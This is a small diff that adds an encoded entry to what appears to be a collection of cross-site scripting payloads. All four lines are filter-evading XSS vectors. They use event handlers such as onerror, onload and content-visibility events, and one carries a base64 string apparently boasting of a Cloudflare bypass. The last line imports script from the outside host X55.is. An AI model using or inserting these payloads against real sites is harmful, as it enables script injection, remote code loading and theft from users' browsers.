@@ -1,3 +1,4 @@
+%3Cimg%2Fsrc%2Fonerror%3Dalert%2F%2F%26NewLine%3B%282%29%3E
 "/hrefd=(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto
 <Svg Only=1 OnLoad=confirm(atob ("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>
 <Img Src=//X55.is OnLoad%0C=import (Src)>
